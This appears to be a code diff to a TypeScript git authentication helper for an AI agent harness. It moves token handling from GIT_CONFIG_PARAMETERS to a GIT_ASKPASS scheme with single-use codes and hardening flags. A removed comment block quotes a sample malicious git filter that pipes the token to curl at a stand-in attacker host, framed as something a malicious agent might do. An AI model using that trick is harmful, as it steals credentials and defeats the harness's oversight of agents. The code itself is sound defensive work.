@@ -1,49 +1,26 @@
 /**
- * git authentication helper using GIT_CONFIG_PARAMETERS.
- * injects Authorization header via http.extraheader config.
- * token is never exposed to shell environment - only to the git subprocess.
+ * git authentication via GIT_ASKPASS.
  *
- * see wiki/git.md "Subcommand Whitelist" for full security documentation.
+ * a localhost HTTP server serves tokens via single-use UUID codes.
+ * each $git() call writes a unique askpass script with the server
+ * port+code baked into the file body — no secrets in subprocess env.
+ *
+ * see wiki/askpass.md for full security documentation.
  */
 
-import { execSync, spawnSync } from "node:child_process";
+import { execSync } from "node:child_process";
 import { createHash } from "node:crypto";
-import { readFileSync, realpathSync } from "node:fs";
+import { readFileSync, realpathSync, unlinkSync } from "node:fs";
 import { log } from "./cli.ts";
+import type { GitAuthServer } from "./gitAuthServer.ts";
 import { filterEnv } from "./secrets.ts";
+import { spawn } from "./subprocess.ts";
 
-/**
- * whitelist of git subcommands safe to run with an auth token in GIT_CONFIG_PARAMETERS.
- *
- * git operations fall into two categories:
- *
- * SAFE (remote-only, no working tree):
- *   fetch - downloads objects, updates refs
- *   push  - uploads objects
- *
- * DANGEROUS (touch working tree, trigger filters that inherit the full subprocess env):
- *   checkout, merge, pull, reset, stash, add, commit, diff (with worktree)
- *
- * a malicious agent can set up a git filter via `.git/config`:
- *   [filter "evil"]
- *       clean = bash -c 'echo "$GIT_CONFIG_PARAMETERS" | curl https://attacker.com'
- *
- * if we ran e.g. `$git("checkout", ...)`, that filter would execute with the token
- * in env and exfiltrate it. fetch and push don't touch working tree files, so
- * filters never run. this was verified empirically.
- *
- * operations that need working tree access (checkout, merge) use `$()` from shell.ts
- * which has NO token in its environment.
- */
 type SafeGitSubcommand = "fetch" | "push";
 
 type GitAuthOptions = {
   token: string;
   cwd?: string;
-  // when true, disables hooks during authenticated git operations to prevent
-  // token exfiltration via malicious hooks reading GIT_CONFIG_PARAMETERS.
-  // should be true whenever shell is not "enabled" (both restricted and disabled).
-  restricted?: boolean;
 };
 
 type GitResult = {
@@ -58,7 +35,6 @@ type GitBinaryInfo = {
   sha256: string;
 };
 
-/** resolved at startup via initGitBinary(), before any agent code runs */
 let gitBinary: GitBinaryInfo | undefined;
 
 function hashFile(path: string): string {
@@ -66,107 +42,131 @@ function hashFile(path: string): string {
 }
 
 /**
- * resolve and fingerprint the git binary. must be called once at startup (in main())
- * before any agent code runs, so the path and hash reflect the untampered binary.
+ * resolve and fingerprint the git binary. must be called once at startup
+ * (in main()) before any agent code runs, so the path and hash reflect
+ * the untampered binary.
  *
- * resolves symlinks via realpath so the hash is of the actual binary, not a symlink.
- * a malicious agent with sudo could replace the binary later, which is caught by
- * verifyGitBinary() before each authenticated call.
+ * resolves symlinks via realpath so the hash is of the actual binary.
+ * a malicious agent with sudo could replace the binary later, which is
+ * caught by verifyGitBinary() before each authenticated call.
  */
 export function resolveGit(): void {
-  // `which git` resolves PATH; realpath follows symlinks (e.g. /usr/bin/git -> /usr/lib/git-core/git)
   const whichPath = execSync("which git", { encoding: "utf-8" }).trim();
   const resolvedPath = realpathSync(whichPath);
   const sha256 = hashFile(resolvedPath);
   gitBinary = { path: resolvedPath, sha256 };
-  log.info(`» git binary: ${resolvedPath} (sha256: ${sha256.slice(0, 12)}...)`);
+  log.info(`git binary: ${resolvedPath} (sha256: ${sha256.slice(0, 12)}...)`);
 }
 
-/**
- * verify the git binary hasn't been tampered with since startup.
- * re-hashes the binary and compares to the startup fingerprint.
- * throws if the binary was replaced (e.g. by a malicious agent with sudo).
- */
 function verifyGitBinary(): string {
   if (!gitBinary) {
-    throw new Error("git binary not initialized - call resolveGit() at startup");
+    throw new Error("git binary not initialized — call resolveGit() at startup");
   }
   const currentHash = hashFile(gitBinary.path);
   if (currentHash !== gitBinary.sha256) {
     throw new Error(
-      `git binary tampered with! expected sha256 ${gitBinary.sha256}, got ${currentHash}. ` +
+      `git binary tampered: expected sha256 ${gitBinary.sha256}, got ${currentHash}. ` +
         `path: ${gitBinary.path}`
     );
   }
   return gitBinary.path;
 }
 
+// --- auth server ---
+
+let authServer: GitAuthServer | undefined;
+
+export function setGitAuthServer(server: GitAuthServer): void {
+  authServer = server;
+}
+
 /**
- * execute authenticated git command.
+ * execute authenticated git command via ASKPASS.
  *
- * subcommand is an explicit first argument restricted to "fetch" | "push" at the type level,
- * preventing accidental use with working-tree operations that would expose the token to filters.
+ * subcommand is restricted to "fetch" | "push" — operations that talk to
+ * a remote and need credentials. working-tree operations (checkout, merge)
+ * use $() from shell.ts which has no token.
  *
- * uses Basic auth format (AUTHORIZATION: basic <base64>) matching actions/checkout.
- * the Bearer format doesn't work with git's extraheader mechanism.
- *
- * the git binary path is resolved once at startup via resolveGit() and verified
- * (sha256 hash check) before each call to detect tampering by a malicious agent.
+ * per call: registers a one-time code with the auth server, writes a
+ * unique askpass script with port+code baked in, spawns git with
+ * GIT_ASKPASS pointing to the script, and deletes the script in finally.
  *
  * @example
- * $git("fetch", ["origin", "main"], { token, restricted: true });
- * $git("push", ["-u", "origin", "feature"], { token, restricted: true });
+ * await $git("fetch", ["origin", "main"], { token });
+ * await $git("push", ["-u", "origin", "feature"], { token });
  */
-export function $git(
+export async function $git(
   subcommand: SafeGitSubcommand,
   args: string[],
   options: GitAuthOptions
-): GitResult {
+): Promise<GitResult> {
   const gitPath = verifyGitBinary();
+
+  if (!authServer) {
+    throw new Error("git auth server not initialized — call setGitAuthServer() at startup");
+  }
+
   const cwd = options.cwd ?? process.cwd();
 
-  // SECURITY: disable hooks during authenticated operations to prevent token exfiltration.
-  // in restricted mode, agents can write .git/hooks/ via shell; in disabled mode, defense-in-depth.
-  if (options.restricted) {
-    const hasHooksOverride = args.some(
-      (arg) => arg.toLowerCase().includes("hookspath") || arg.toLowerCase().includes("hooks")
-    );
-    if (hasHooksOverride) {
-      throw new Error("Blocked: git args contain hooks-related config");
-    }
-  }
-  const fullArgs = options.restricted
-    ? ["-c", "core.hooksPath=/dev/null", subcommand, ...args]
-    : [subcommand, ...args];
+  const code = authServer.register(options.token);
+  const scriptPath = authServer.writeAskpassScript(code);
+
+  // -c flags override local .git/config — defense-in-depth against
+  // agent-set config that could spawn subprocesses before ASKPASS runs
+  const fullArgs = [
+    "-c",
+    "core.fsmonitor=false",
+    "-c",
+    "credential.helper=",
+    "-c",
+    "protocol.file.allow=never",
+    "-c",
+    "core.sshCommand=ssh",
+    subcommand,
+    ...args,
+  ];
 
   log.debug(`git ${fullArgs.join(" ")}`);
 
-  // use Basic auth format matching actions/checkout
-  // format: AUTHORIZATION: basic base64(x-access-token:TOKEN)
-  // Bearer format does NOT work with git's extraheader - git ignores it
-  const basicCredential = Buffer.from(`x-access-token:${options.token}`).toString("base64");
+  try {
+    const result = await spawn({
+      cmd: gitPath,
+      args: fullArgs,
+      cwd,
+      env: {
+        ...filterEnv(),
+        GIT_ASKPASS: scriptPath,
+        GIT_TERMINAL_PROMPT: "0",
+        // blocks env-based git config injection from outer processes.
+        // GIT_CONFIG_COUNT=0 blocks the newer KEY_n/VALUE_n mechanism.
+        // GIT_CONFIG_PARAMETERS="" clears the legacy quoted-list mechanism.
+        // both are needed — they are independent systems.
+        GIT_CONFIG_COUNT: "0",
+        GIT_CONFIG_PARAMETERS: "",
+      },
+      activityTimeout: 0,
+    });
 
-  const result = spawnSync(gitPath, fullArgs, {
-    cwd,
-    env: {
-      ...filterEnv(),
-      // inject auth header via GIT_CONFIG_PARAMETERS - never stored, only for this process
-      GIT_CONFIG_PARAMETERS: `'http.https://github.com/.extraheader=AUTHORIZATION: basic ${basicCredential}'`,
-      // disable terminal prompts (would hang in CI)
-      GIT_TERMINAL_PROMPT: "0",
-    },
-    encoding: "utf-8",
-    maxBuffer: 50 * 1024 * 1024,
-  });
+    if (result.stderr.includes("askpass-compromised")) {
+      log.info("askpass code was already consumed — token has been revoked");
+      throw new Error("git auth failed — askpass code was already consumed, token revoked");
+    }
 
-  if (result.status !== 0) {
-    const stderr = result.stderr?.trim() ?? "";
-    log.info(`git ${subcommand} failed: ${stderr}`);
-    throw new Error(`git ${subcommand} failed: ${stderr}`);
+    if (result.exitCode !== 0) {
+      const stderr = result.stderr.trim();
+      log.info(`git ${subcommand} failed: ${stderr}`);
+      throw new Error(`git ${subcommand} failed: ${stderr}`);
+    }
+
+    return {
+      stdout: result.stdout.trim(),
+      stderr: result.stderr.trim(),
+    };
+  } finally {
+    try {
+      unlinkSync(scriptPath);
+    } catch {
+      // script may have self-deleted already
+    }
   }
-
-  return {
-    stdout: result.stdout?.trim() ?? "",
-    stderr: result.stderr?.trim() ?? "",
-  };
 }
